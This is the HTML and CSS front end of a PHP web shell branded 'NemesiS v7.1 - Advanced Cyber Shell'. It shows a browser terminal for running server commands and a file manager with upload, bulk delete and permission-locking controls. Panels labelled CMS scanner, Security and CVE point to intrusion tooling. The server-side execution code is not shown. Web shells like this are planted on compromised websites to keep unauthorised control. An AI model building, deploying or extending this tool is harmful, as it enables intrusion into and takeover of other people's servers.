    .color-wrap{position:relative;width:13px;height:13px;border-radius:50%;overflow:hidden;border:2px solid var(--dim);cursor:pointer;flex-shrink:0;background:conic-gradient(red,yellow,lime,cyan,blue,magenta,red)}
    #color-in{position:absolute;inset:-3px;opacity:.01;cursor:pointer;width:20px;height:20px}
    #logout-btn{background:transparent;border:1px solid var(--d);color:var(--d);font-family:'JetBrains Mono',monospace;font-size:8px;padding:2px 7px;border-radius:4px;cursor:pointer;transition:all .15s;margin-left:auto;flex-shrink:0;white-space:nowrap}
    #logout-btn:hover{background:rgba(239,68,68,.1)}
    #nav{display:flex;gap:2px;overflow-x:auto;flex-shrink:0;padding-bottom:1px}
    #nav::-webkit-scrollbar{height:2px}#nav::-webkit-scrollbar-thumb{background:var(--b)}
    .nb{background:var(--s);border:1px solid var(--b);color:var(--dim);font-family:'JetBrains Mono',monospace;font-size:8.5px;padding:4px 8px;border-radius:5px 5px 0 0;cursor:pointer;transition:all .15s;white-space:nowrap;flex-shrink:0;border-bottom:2px solid transparent}
    .nb:hover{color:var(--t);background:var(--s2)}
    .nb.on{border-color:var(--b);border-bottom-color:var(--a);color:var(--a);background:var(--s2);font-weight:600}
    #content{display:flex;flex:1;min-height:0;gap:4px}
    .panel{display:none;flex-direction:column;flex:1;min-height:0;gap:4px;animation:pfade .15s ease}
    .panel.on{display:flex}
    @keyframes pfade{from{opacity:0;transform:translateY(3px)}to{opacity:1;transform:none}}
    #tab-bar{display:flex;gap:2px;flex-shrink:0;align-items:center;overflow-x:auto}
    #tab-bar::-webkit-scrollbar{height:2px}
    .tab{display:flex;align-items:center;gap:4px;background:var(--s2);border:1px solid var(--b);border-radius:4px;padding:3px 8px;cursor:pointer;font-size:8.5px;color:var(--dim);transition:all .15s;white-space:nowrap;flex-shrink:0}
    .tab:hover{color:var(--t)}.tab.on{border-color:var(--a);color:var(--a);background:var(--s3)}
    .tab-x{opacity:.4;font-size:11px;transition:all .15s}.tab-x:hover{opacity:1;color:var(--d)}
    #add-tab{background:transparent;border:1px dashed var(--b);color:var(--dim);border-radius:4px;padding:3px 8px;cursor:pointer;font-size:12px;line-height:1;transition:all .15s;flex-shrink:0}
    #add-tab:hover{border-color:var(--a);color:var(--a)}
    #pin-bar{display:none;gap:3px;flex-shrink:0;flex-wrap:wrap}
    #pin-bar.show{display:flex}
    .pin-btn{background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.3);color:var(--a);font-family:'JetBrains Mono',monospace;font-size:8px;padding:2px 7px;border-radius:3px;cursor:pointer;transition:all .15s;display:flex;align-items:center;gap:3px}
    .pin-btn:hover{background:rgba(245,158,11,.2)}.pin-x{opacity:.5;font-size:9px}.pin-x:hover{opacity:1;color:var(--d)}
    #split-wrap{display:flex;flex:1;min-height:0;gap:4px}
    .term-pane{display:flex;flex-direction:column;flex:1;min-height:0;gap:3px}
    #split-div{width:4px;background:var(--b);cursor:col-resize;border-radius:2px;transition:background .15s;flex-shrink:0;display:none}
    #split-div:hover{background:var(--a)}
    #pane2{display:none}
    #pane2.show{display:flex}
    .cwdb{background:var(--s);border:1px solid var(--b);border-radius:5px;padding:3px 8px;font-size:8.5px;color:var(--dim);flex-shrink:0;display:flex;align-items:center;gap:4px;transition:border-color .2s}
    .cwdb.busy{border-color:var(--a);animation:pulse .8s infinite}
    @keyframes pulse{0%,100%{box-shadow:none}50%{box-shadow:var(--glow)}}
    .bc-wrap{display:flex;align-items:center;gap:1px;flex:1;overflow:hidden;flex-wrap:nowrap;min-width:0}
    .bcp{color:var(--a2);cursor:pointer;font-size:8px;white-space:nowrap;transition:color .15s}.bcp:hover{color:var(--a)}
    .bcs{color:var(--faint);font-size:8px}
    .term-out{flex:1;overflow-y:auto;background:var(--s);border:1px solid var(--b);border-radius:6px;padding:9px;line-height:1.75;position:relative;word-wrap:break-word}
    .term-out::-webkit-scrollbar{width:4px}.term-out::-webkit-scrollbar-thumb{background:var(--b2);border-radius:2px}
    .term-out.nowrap .eo{white-space:pre!important;overflow-x:auto}
    .srch{position:sticky;top:0;background:var(--s2);border:1px solid var(--a);border-radius:4px;padding:3px 7px;display:none;align-items:center;gap:5px;z-index:10;margin-bottom:4px}
    .srch.on{display:flex}
    .srch input{background:transparent;border:none;outline:none;color:var(--t);font-family:'JetBrains Mono',monospace;font-size:10px;width:130px}
    .srch-n{font-size:8.5px;color:var(--dim)}
    .hl{background:rgba(251,191,36,.3);border-radius:2px}.hl-c{background:rgba(251,191,36,.65)}
    .entry{margin-bottom:2px;animation:fi .1s}
    @keyframes fi{from{opacity:0;transform:translateY(2px)}to{opacity:1;transform:none}}
    .ep{margin-bottom:1px;display:flex;align-items:baseline;gap:3px;flex-wrap:wrap;font-size:10.5px}
    .eu{color:var(--a3)}.eat{color:var(--faint)}.eho{color:var(--p)}.ec{color:var(--faint)}.epath{color:var(--w)}.edol{color:var(--a);font-weight:700}.ecmd{color:var(--t)}
    .eo{white-space:pre-wrap;word-break:break-word;padding-left:2px;font-size:10.5px}
    .a30{color:#6b7280}.a31{color:#f87171}.a32{color:#4ade80}.a33{color:#fbbf24}.a34{color:#60a5fa}.a35{color:#c084fc}.a36{color:#22d3ee}.a37{color:#f1f5f9}
    .a90{color:#9ca3af}.a91{color:#fca5a5}.a92{color:#86efac}.a93{color:#fde68a}.a94{color:#93c5fd}.a95{color:#f0abfc}.a96{color:#67e8f9}.a97{color:#fff}
    .ab{font-weight:700}.ai{font-style:italic}.au{text-decoration:underline}
    .eo.err{color:var(--d)}.eo.info{color:var(--a2)}.eo.ok{color:var(--a3)}
    .timer{font-size:7.5px;color:var(--faint);background:var(--s2);border:1px solid var(--b);border-radius:3px;padding:1px 5px;margin-left:4px;font-family:'Space Grotesk',sans-serif}
    .spin{display:inline-block;width:8px;height:8px;border:2px solid var(--b2);border-top-color:var(--a);border-radius:50%;animation:spin .4s linear infinite;vertical-align:middle;margin-right:4px}
    @keyframes spin{to{transform:rotate(360deg)}}
    .inbar{display:flex;align-items:center;background:var(--s);border:1px solid var(--b);border-radius:6px;padding:0 9px;gap:5px;height:36px;flex-shrink:0;transition:border-color .2s,box-shadow .2s}
    .inbar:focus-within{border-color:var(--a);box-shadow:var(--glow)}
    .ips{color:var(--a3);font-size:9px;user-select:none;white-space:nowrap;flex-shrink:0}
    .cmd-i{flex:1;background:transparent;border:none;outline:none;color:var(--t);font-family:'JetBrains Mono',monospace;font-size:10.5px;caret-color:var(--a2)}
    .cmd-i::placeholder{color:var(--faint)}
    .run-btn{background:linear-gradient(135deg,var(--a),var(--a2));color:#fff;border:none;font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:8.5px;padding:5px 10px;border-radius:4px;cursor:pointer;transition:all .15s;white-space:nowrap;flex-shrink:0;letter-spacing:.03em}
    .run-btn:hover{opacity:.85;box-shadow:var(--glow)}.run-btn:active{transform:scale(.95)}.run-btn:disabled{opacity:.3;cursor:not-allowed}
    #fm-sb{width:155px;flex-shrink:0;background:var(--s);border:1px solid var(--b);border-radius:6px;display:flex;flex-direction:column;overflow:hidden}
    #fm-sb-t{padding:6px 8px;font-size:7.5px;color:var(--dim);letter-spacing:.1em;border-bottom:1px solid var(--b);font-family:'Space Grotesk',sans-serif;font-weight:700;text-transform:uppercase}
    #fm-tree{flex:1;overflow-y:auto;padding:2px 0}
    #fm-tree::-webkit-scrollbar{width:3px}
    .ftree{padding:3px 8px;font-size:9px;cursor:pointer;display:flex;align-items:center;gap:4px;color:var(--dim);transition:all .1s;border-left:2px solid transparent;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
    .ftree:hover{color:var(--t);background:var(--s2)}.ftree.on{color:var(--a);border-left-color:var(--a);background:var(--s3)}
    #fm-main{flex:1;display:flex;flex-direction:column;min-height:0;gap:3px}
    #fm-tb{display:flex;gap:3px;align-items:center;flex-wrap:wrap;flex-shrink:0}
    #fm-bread{font-size:8.5px;color:var(--a2);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;background:var(--s2);border:1px solid var(--b);border-radius:4px;padding:3px 6px}
    .bc{cursor:pointer;color:var(--a);transition:color .15s}.bc:hover{color:var(--a2)}
    #fm-vt{display:flex;gap:2px}
    .fvb{background:var(--s2);border:1px solid var(--b);color:var(--dim);font-size:10px;padding:2px 5px;border-radius:3px;cursor:pointer;transition:all .15s}
    .fvb.on{border-color:var(--a);color:var(--a);background:var(--s3)}
    #fm-goto-row{display:flex;gap:4px;align-items:center;flex-shrink:0;padding:2px 0}
    #fm-goto-row input{flex:1;background:var(--s2);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:9px;padding:4px 6px;border-radius:4px;outline:none;transition:border-color .2s;min-width:0}
    #fm-goto-row input:focus{border-color:var(--a)}
    #fm-filter-row{display:flex;gap:3px;align-items:center;flex-shrink:0}
    #fm-search{background:var(--s2);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:9px;padding:2px 6px;border-radius:3px;outline:none;width:115px;transition:border-color .2s}
    #fm-search:focus{border-color:var(--a)}
    #fm-sort{background:var(--s2);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:9px;padding:2px 4px;border-radius:3px;outline:none;cursor:pointer}
    #bulk-bar{display:none;gap:4px;align-items:center;flex-shrink:0;padding:3px 7px;background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.3);border-radius:5px}
    #bulk-bar.show{display:flex}
    #bulk-count{font-size:8.5px;color:var(--a);flex:1}
    #fm-list{flex:1;overflow-y:auto;background:var(--s);border:1px solid var(--b);border-radius:6px}
    #fm-list::-webkit-scrollbar{width:4px}#fm-list::-webkit-scrollbar-thumb{background:var(--b2);border-radius:2px}
    #fm-list.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(88px,1fr));gap:4px;padding:5px}
    .fmi{display:flex;align-items:center;gap:5px;padding:4px 7px;cursor:pointer;transition:background .1s;border-bottom:1px solid rgba(255,255,255,.02);font-size:9.5px;user-select:none}
    .fmi:hover{background:var(--s2)}.fmi.fmi-dir>.fmi-name{color:var(--a2);font-weight:600}
    .fmi.sel{background:var(--s3);border-left:2px solid var(--a)}
    .fmi input[type=checkbox]{accent-color:var(--a);flex-shrink:0;width:10px;height:10px}
    .fmi-icon{font-size:11px;flex-shrink:0}.fmi-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
    .fmi-meta{color:var(--dim);font-size:7.5px;display:flex;gap:3px;flex-shrink:0}
    .fma{background:transparent;border:none;color:var(--dim);cursor:pointer;font-size:9px;padding:1px 2px;transition:color .12s;line-height:1}
    .fma:hover{color:var(--a)}.fma.del:hover{color:var(--d)}.fma.lk:hover{color:var(--w)}
    .fmi.grid-item{flex-direction:column;align-items:center;padding:6px 4px;border:1px solid var(--b);border-radius:5px;border-bottom:1px solid var(--b);gap:2px;text-align:center;min-height:62px;background:var(--s2)}
    .fmi.grid-item:hover{background:var(--s3)}
    .fmi.grid-item .fmi-icon{font-size:18px}.fmi.grid-item .fmi-name{font-size:8px;width:100%}
    .fmi.grid-item .fmi-meta,.fmi.grid-item input[type=checkbox]{display:none}
    .fmi-prev{width:34px;height:34px;object-fit:cover;border-radius:2px;border:1px solid var(--b);flex-shrink:0}
    #fm-foot{display:flex;gap:3px;align-items:center;flex-shrink:0}
    #fm-foot input{flex:1;background:var(--s2);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:9px;padding:4px 6px;border-radius:4px;outline:none;transition:border-color .2s}
    #fm-foot input:focus{border-color:var(--a)}
    .fm-stat{font-size:8px;color:var(--dim);padding:2px 5px;background:var(--s2);border:1px solid var(--b);border-radius:3px;white-space:nowrap}
    .tbox{background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px;display:flex;flex-direction:column;gap:7px;flex:1;overflow-y:auto}
    .tbox::-webkit-scrollbar{width:3px}.tbox::-webkit-scrollbar-thumb{background:var(--b2)}
    .tt{font-family:'Space Grotesk',sans-serif;font-size:8.5px;color:var(--a);letter-spacing:.1em;border-bottom:1px solid var(--b);padding-bottom:4px;font-weight:700;text-transform:uppercase}
    .trow{display:flex;gap:5px;flex-wrap:wrap;align-items:flex-end}
    .tf{display:flex;flex-direction:column;gap:2px;flex:1;min-width:90px}
    .tf label{font-size:7.5px;color:var(--dim);letter-spacing:.04em;text-transform:uppercase}
    .ti{background:var(--s2);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:10px;padding:5px 7px;border-radius:4px;outline:none;width:100%;transition:border-color .2s}
    .ti:focus{border-color:var(--a);box-shadow:0 0 0 2px rgba(245,158,11,.1)}.ta{resize:vertical;min-height:55px}
    select.ti{cursor:pointer}
    .tb2{background:transparent;border:1px solid var(--a);color:var(--a);font-family:'JetBrains Mono',monospace;font-size:8.5px;padding:4px 10px;border-radius:4px;cursor:pointer;transition:all .15s;white-space:nowrap}
    .tb2:hover{background:rgba(245,158,11,.1);box-shadow:var(--glow)}
    .rbox{background:var(--s2);border:1px solid var(--b);border-radius:5px;padding:8px;font-size:9.5px;color:var(--t);white-space:pre-wrap;word-break:break-word;max-height:200px;overflow-y:auto;min-height:30px}
    .rbox::-webkit-scrollbar{width:3px}.rbox::-webkit-scrollbar-thumb{background:var(--b2)}
    .dgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:5px;flex:1;min-height:0;overflow-y:auto}
    .dcard{background:var(--s);border:1px solid var(--b);border-radius:6px;padding:10px;display:flex;flex-direction:column;gap:6px}
    .si-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(75px,1fr));gap:4px}
    .si-c{background:var(--s2);border:1px solid var(--b);border-radius:4px;padding:6px 8px}
    .si-c label{font-size:7px;color:var(--dim);letter-spacing:.05em;display:block;text-transform:uppercase}
    .si-c p{font-size:9px;color:var(--t);margin-top:1px;word-break:break-all}
    .disk-bar{width:100%;height:4px;background:var(--b);border-radius:2px;overflow:hidden;margin-top:3px}
    .disk-fill{height:100%;background:linear-gradient(90deg,var(--a),var(--a2));border-radius:2px;transition:width .5s}
    .overlay{position:fixed;inset:0;background:rgba(0,0,0,.85);display:none;align-items:center;justify-content:center;z-index:800;backdrop-filter:blur(6px)}
    .overlay.on{display:flex}
    .modal{background:var(--s);border:1px solid var(--b);border-radius:10px;padding:16px;min-width:250px;display:flex;flex-direction:column;gap:8px}
    .modal h2{font-family:'Space Grotesk',sans-serif;font-size:9px;color:var(--a);letter-spacing:.1em;font-weight:700;text-transform:uppercase}
    .mrow{display:flex;gap:6px}
    #ed-modal{background:var(--s);border:1px solid var(--b);border-radius:10px;width:min(900px,97vw);height:84vh;display:flex;flex-direction:column;overflow:hidden}
    #ed-bar{display:flex;align-items:center;padding:6px 10px;border-bottom:1px solid var(--b);gap:5px;flex-shrink:0;flex-wrap:wrap}
    #ed-name{font-family:'Space Grotesk',sans-serif;font-size:9px;color:var(--a);flex:1;font-weight:700}
    #ed-status{font-size:8px;color:var(--dim)}
    #ed-tabs{display:flex;gap:2px;overflow-x:auto;padding:3px 9px;border-bottom:1px solid var(--b);flex-shrink:0;background:var(--s2)}
    #ed-tabs::-webkit-scrollbar{height:2px}
    .ed-tab{font-size:8.5px;padding:2px 8px;border-radius:3px;cursor:pointer;color:var(--dim);border:1px solid transparent;white-space:nowrap;display:flex;align-items:center;gap:3px;transition:all .15s}
    .ed-tab:hover{color:var(--t)}.ed-tab.on{color:var(--a);border-color:rgba(245,158,11,.3);background:var(--s3)}
    .ed-tab-x{opacity:.4;font-size:9.5px}.ed-tab-x:hover{opacity:1;color:var(--d)}
    #ed-wrap{display:flex;flex:1;min-height:0;overflow:hidden}
    #ed-lines{background:var(--s3);border-right:1px solid var(--b);padding:9px 6px;font-size:10px;line-height:1.7;color:var(--faint);text-align:right;user-select:none;overflow:hidden;min-width:34px;font-family:'JetBrains Mono',monospace}
    #ed-area{flex:1;background:var(--s2);border:none;outline:none;color:var(--t);font-family:'JetBrains Mono',monospace;font-size:10.5px;line-height:1.7;padding:9px;resize:none;width:100%;tab-size:4}
    #ed-fr{display:none;padding:4px 9px;border-top:1px solid var(--b);background:var(--s3);flex-shrink:0;gap:5px;flex-wrap:wrap;align-items:center}
    #ed-fr.on{display:flex}
    #ed-fr input{background:var(--s2);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:9.5px;padding:3px 6px;border-radius:3px;outline:none;width:120px;transition:border-color .2s}
    #ed-fr input:focus{border-color:var(--a)}
    #ed-goto{display:none;padding:4px 9px;border-top:1px solid var(--b);background:var(--s3);flex-shrink:0;gap:5px;align-items:center}
    #ed-goto.on{display:flex}
    #ed-goto input{background:var(--s2);border:1px solid var(--b);color:var(--t);font-family:'JetBrains Mono',monospace;font-size:9.5px;padding:3px 6px;border-radius:3px;outline:none;width:70px}
    #ed-info{padding:3px 9px;border-top:1px solid var(--b);font-size:8px;color:var(--dim);display:flex;gap:8px;flex-shrink:0;background:var(--s2);align-items:center}
    .cve-tabs{display:flex;gap:3px;flex-shrink:0}
    .cve-tab{font-size:8.5px;padding:3px 10px;border-radius:4px;cursor:pointer;color:var(--dim);background:var(--s2);border:1px solid var(--b);transition:all .15s}
    .cve-tab:hover{color:var(--t)}.cve-tab.on{color:var(--a);border-color:rgba(245,158,11,.4);background:var(--s3);font-weight:600}
    #statusbar{background:var(--s);border:1px solid var(--b);border-radius:5px;padding:2px 9px;font-size:7.5px;color:var(--dim);flex-shrink:0;display:flex;align-items:center;gap:10px}
    .sb-item{display:flex;align-items:center;gap:3px}
    .sb-item b{color:var(--t)}
    .sb-sec{color:var(--a3);font-size:7px}
    #ac{position:fixed;background:var(--s2);border:1px solid var(--a);border-radius:5px;padding:2px 0;z-index:999;max-height:140px;overflow-y:auto;min-width:140px;box-shadow:0 8px 24px rgba(0,0,0,.6);display:none}
    .aci{padding:3px 9px;cursor:pointer;font-size:10px;color:var(--dim);transition:background .1s}
    .aci:hover,.aci.on{background:rgba(245,158,11,.12);color:var(--a)}
    #ac::-webkit-scrollbar{width:3px}#ac::-webkit-scrollbar-thumb{background:var(--b2)}
    #toast{position:fixed;bottom:46px;right:10px;background:var(--s);border:1px solid var(--b);border-radius:6px;padding:6px 12px;font-size:9.5px;color:var(--t);z-index:2000;transform:translateY(10px);opacity:0;transition:all .2s;pointer-events:none;max-width:240px;box-shadow:0 4px 20px rgba(0,0,0,.4)}
    #toast.on{opacity:1;transform:none}
    #toast.ok{border-color:var(--a3);color:var(--a3)}
    #toast.err{border-color:var(--d);color:var(--d)}
    #dz{border:2px dashed var(--b);border-radius:5px;padding:12px;text-align:center;font-size:9.5px;color:var(--dim);cursor:pointer;transition:all .2s}
    #dz.drag{border-color:var(--a);color:var(--a);background:rgba(245,158,11,.05)}
    #dz input{display:none}
    #alog{background:var(--s2);border:1px solid var(--b);border-radius:4px;padding:6px;font-size:8.5px;max-height:140px;overflow-y:auto}
    .alog-r{display:flex;gap:5px;padding:1.5px 0;border-bottom:1px solid rgba(255,255,255,.03);font-size:8px}
    .alog-t{color:var(--faint);flex-shrink:0}.alog-u{color:var(--a);flex-shrink:0}.alog-a{color:var(--t)}.alog-ip{color:var(--faint);flex-shrink:0}
    #cs-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(175px,1fr));gap:4px}
    .cs-s{background:var(--s2);border:1px solid var(--b);border-radius:5px;padding:7px 9px}
    .cs-s h3{font-family:'Space Grotesk',sans-serif;font-size:7.5px;color:var(--a);letter-spacing:.1em;margin-bottom:5px;padding-bottom:3px;border-bottom:1px solid var(--b);font-weight:700;text-transform:uppercase}
    .cs-r{display:flex;justify-content:space-between;padding:1.5px 0;font-size:8px}
    .cs-k{color:var(--a2);font-weight:700;flex-shrink:0;margin-right:5px}.cs-d{color:var(--dim);font-size:7.5px}
    .ag{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:4px}
    .ac2{background:var(--s2);border:1px solid var(--b);border-radius:4px;padding:6px 8px}
    .ac2 label{font-size:7px;color:var(--dim);letter-spacing:.05em;display:block;text-transform:uppercase}
    .ac2 p{font-size:9px;color:var(--t);margin-top:1px;word-break:break-all}
    .preview-box{background:var(--s3);border:1px solid var(--b);border-radius:3px;padding:5px;font-size:9px;color:var(--t);white-space:pre-wrap;word-break:break-word;max-height:100px;overflow-y:auto;margin-top:2px;display:none}
    .preview-box.on{display:block}
    .diff-add{background:rgba(74,222,128,.1);border-left:3px solid #4ade80;padding-left:4px}
    .diff-del{background:rgba(248,113,113,.1);border-left:3px solid #f87171;padding-left:4px}
    .diff-hdr{color:var(--a2);font-weight:700}
    .score-bar{height:4px;background:var(--b);border-radius:2px;overflow:hidden;margin-bottom:6px}
    .score-fill{height:100%;border-radius:2px;transition:width .5s}
    @keyframes fadeOut{from{opacity:1}to{opacity:0;transform:translateX(10px)}}
    .fullscreen{position:fixed!important;inset:0!important;z-index:700!important;padding:8px!important;background:var(--bg)!important;border-radius:0!important;animation:none!important}
    @media(max-width:600px){#fm-sb{display:none}#hdr .dw{display:none}.chip:not(.hi){display:none}#ed-modal{width:100vw;height:100vh;border-radius:0}}
    .author-foot{font-size:7px;color:var(--faint);text-align:center;padding:2px 0;letter-spacing:.08em}
    .author-foot span{color:var(--a2)}
    </style>
    </head>
    <body>
    <div id="loading">
    <div id="ll">NemesiS</div>
    <div id="lsub">⚡ advanced cyber shell ⚡</div>
    <div id="lpct">0%</div>
    <div id="lbar-w"><div id="lbar"></div></div>
    <div id="lstat">Initializing...</div>
    </div>
    <div id="app" style="opacity:0;transition:opacity .4s">
    <div id="hdr">
    <span id="logo">NemesiS <span>v7.1</span></span>
    <div class="dw"><span class="dw-l">Disk</span><span class="dw-v" id="dw-disk">-</span><div class="dw-bar"><div class="dw-fill" id="dw-df" style="width:0%"></div></div></div>
    <div class="dw"><span class="dw-l">Load</span><span class="dw-v" id="dw-load">-</span></div>
    <div class="dw"><span class="dw-l">Uptime</span><span class="dw-v" id="dw-up">-</span></div>
    <div class="chip hi">User: <b><?=esc($user)?></b></div>
    <div class="chip">Host: <b><?=esc($hostname)?></b></div>
    <div class="chip">IP: <b><?=esc($serverip)?></b></div>
    <div class="chip">PHP <b><?=esc($phpver)?></b></div>
    <div id="font-ctrl">
    <span>Aa</span>
    <button class="fcb" onclick="adjFont(-1)">-</button>
    <button class="fcb" onclick="adjFont(1)">+</button>
    </div>
    <div id="themes">
    <div class="td td-gold on"     title="Gold"     onclick="setTheme('gold')"></div>
    <div class="td td-gold-dark"    title="Dark Gold" onclick="setTheme('gold-dark')"></div>
    <div class="td td-light"       title="Light"    onclick="setTheme('light')"></div>
    <div class="color-wrap" title="Custom" onclick="document.getElementById('color-in').click()">
    <input type="color" id="color-in" value="#f59e0b" oninput="setCustomColor(this.value)">
    </div>
    </div>
    <button id="logout-btn" onclick="location='?logout'">⏻ Logout</button>
    </div>
    <div id="nav">
    <button class="nb on" onclick="sp('terminal',this)">Terminal</button>
    <button class="nb"    onclick="sp('files',this)">Files</button>
    <button class="nb"    onclick="sp('deep',this)">Deep</button>
    <button class="nb"    onclick="sp('network',this)">Network</button>
    <button class="nb"    onclick="sp('hashing',this)">Hash</button>
    <button class="nb"    onclick="sp('strings',this)">Strings</button>
    <button class="nb"    onclick="sp('scanner',this)">CMS</button>
    <button class="nb"    onclick="sp('security',this)">Security</button>
    <button class="nb"    onclick="sp('cve',this)">CVE</button>
    <button class="nb"    onclick="sp('sysinfo',this)">SysInfo</button>
    <button class="nb"    onclick="sp('cfg',this)">Config</button>
    <button class="nb"    onclick="sp('cheatsheet',this)">Keys</button>
    <button class="nb"    onclick="sp('about',this)">About</button>
    <button class="nb"    onclick="sp('advanced',this)">Advanced</button>
    </div>
    <div id="content">
    <!-- Terminal -->
    <div class="panel on" id="panel-terminal">
    <div style="display:flex;gap:3px;align-items:center;flex-shrink:0;flex-wrap:wrap">
    <div id="tab-bar">
    <div class="tab on" id="tab-default" data-id="default"><span>terminal 1</span><span class="tab-x" onclick="closeTab(event,'default')">✕</span></div>
    <button id="add-tab" onclick="newTab()">+</button>
    </div>
    <div style="margin-left:auto;display:flex;gap:2px;flex-shrink:0">
    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="toggleSrch()">Find</button>
    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="clearTerm()">Clear</button>
    <button class="tb2" style="font-size:7.5px;padding:2px 5px" id="wrap-btn" onclick="toggleWrap()" title="Wrap">Wrap</button>
    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="addPin()" title="Pin">Pin</button>
    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="toggleSplit()" title="Split">Split</button>
    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="exportOutput()" title="Export">Export</button>
    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="openPalette()" title="Palette">Palette</button>
    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="toggleFS('panel-terminal')" title="Fullscreen">Full</button>
    <span id="queue-badge" style="display:none;font-size:8px;color:var(--w);border:1px solid var(--w);border-radius:3px;padding:1px 5px"></span>
    </div>
    </div>
    <div id="pin-bar"></div>
    <div id="split-wrap">
    <div class="term-pane" id="pane1">
    <div class="cwdb" id="cwdb1">📁 <div class="bc-wrap" id="bc1"></div></div>
    <div class="term-out" id="terminal1">
    <div class="srch" id="srch1"><input placeholder="search..." oninput="doSearch(1)"><span class="srch-n" id="srch-n1">0/0</span><button class="fma" onclick="searchNav(1,-1)">▲</button><button class="fma" onclick="searchNav(1,1)">▼</button><button class="fma" onclick="toggleSrch()">✕</button></div>
    <div class="entry"><div class="eo info">  NemesiS v7.1 - Advanced Cyber Shell
    Powered by PHP <?=esc($phpver)?> | <?=esc($user)?>@<?=esc($hostname)?>
    Type 'help' for guide. Ctrl+P = command palette.
    ⚡ crafted by MataKucing ⚡</div></div>
    </div>
    <div class="inbar">
    <span class="ips" id="ips1"><?=esc($user)?>@<?=esc($hostname)?>:$</span>
    <input class="cmd-i" id="cmd1" type="text" autocomplete="off" spellcheck="false" placeholder="enter command...">
    <button class="run-btn" id="run-btn1" onclick="runCmd(1)">RUN</button>
    </div>
    </div>
    <div id="split-div"></div>
    <div class="term-pane" id="pane2">
    <div style="display:flex;gap:2px;align-items:center;flex-shrink:0">
    <span style="font-size:8.5px;color:var(--dim)">Split 2</span>
    <button class="tb2" style="font-size:7.5px;padding:2px 5px;margin-left:auto" onclick="toggleSrch(2)">Find</button>
    <button class="tb2" style="font-size:7.5px;padding:2px 5px" onclick="clearTerm(2)">Clear</button>
    </div>
    <div class="cwdb" id="cwdb2">📁 <div class="bc-wrap" id="bc2"></div></div>
    <div class="term-out" id="terminal2">
    <div class="srch" id="srch2"><input placeholder="search..." oninput="doSearch(2)"><span class="srch-n" id="srch-n2">0/0</span><button class="fma" onclick="searchNav(2,-1)">▲</button><button class="fma" onclick="searchNav(2,1)">▼</button><button class="fma" onclick="toggleSrch(2)">✕</button></div>
    <div class="entry"><div class="eo info">Split terminal 2 ready.</div></div>
    </div>
    <div class="inbar">
    <span class="ips" id="ips2"><?=esc($user)?>@<?=esc($hostname)?>:$</span>
    <input class="cmd-i" id="cmd2" type="text" autocomplete="off" spellcheck="false" placeholder="command...">
    <button class="run-btn" id="run-btn2" onclick="runCmd(2)">RUN</button>
    </div>
    </div>
    </div>
    </div>
    <!-- Files -->
    <div class="panel" id="panel-files">
    <div id="fm-tb">
    <button class="tb2" onclick="fmUp()">↑</button>
    <div id="fm-bread">-</div>
    <div id="fm-vt"><button class="fvb on" id="fvb-l" onclick="setFmV('list')">☰</button><button class="fvb" id="fvb-g" onclick="setFmV('grid')">⊞</button></div>
    <button class="tb2" onclick="fmRefresh()">↺</button>
    <button class="tb2" onclick="showOverlay('upload-ov')">Upload</button>
    <button class="tb2" onclick="toggleFS('panel-files')">Full</button>
    </div>
    <div id="fm-goto-row">
    <input id="fm-goto-input" placeholder="Go to directory path..." onkeydown="if(event.key==='Enter') fmGoto()">
    <button class="tb2" onclick="fmGoto()" style="padding:2px 8px;font-size:8px">Go</button>
    </div>
    <div id="fm-filter-row">
    <input id="fm-search" placeholder="filter..." oninput="fmFilter()">
    <select id="fm-sort" onchange="fmSortChg()">
    <option value="name">Name↑</option><option value="name-d">Name↓</option>
    <option value="size">Size↑</option><option value="size-d">Size↓</option>
    <option value="date">Date↑</option><option value="date-d">Date↓</option>
    </select>
    </div>
    <div id="bulk-bar">
    <span id="bulk-count">0 selected</span>
    <button class="tb2" style="font-size:8px;padding:2px 6px" onclick="bulkDel()">Del</button>
    <button class="tb2" style="font-size:8px;padding:2px 6px" onclick="bulkChmod('775')">Lock 775</button>
    <button class="tb2" style="font-size:8px;padding:2px 6px" onclick="bulkChmod('444')">Lock 444</button>
    <button class="tb2" style="font-size:8px;padding:2px 6px;border-color:var(--d);color:var(--d)" onclick="clearSel()">✕</button>
    </div>
    <div style="display:flex;flex:1;min-height:0;gap:4px">
    <div id="fm-sb"><div id="fm-sb-t">Quick Nav</div><div id="fm-tree"></div></div>
    <div id="fm-main">
    <div id="fm-list"></div>
    <div id="fm-foot">
    <input id="fm-new" placeholder="new folder..." onkeydown="if(event.key==='Enter')fmMkdir()">
    <button class="tb2" onclick="fmMkdir()">+ Dir</button>
    <span class="fm-stat" id="fm-stat">-</span>
    </div>
    </div>
    </div>
    </div>
    <!-- Deep -->
    <div class="panel" id="panel-deep">
    <div class="dgrid">
    <div class="dcard"><div class="tt">Deep Search</div>
    <div class="trow"><div class="tf"><label>Dir</label><input class="ti" id="ds-dir" placeholder="<?=esc($cwd)?>"></div><div class="tf"><label>Query</label><input class="ti" id="ds-q" placeholder="search..."></div></div>
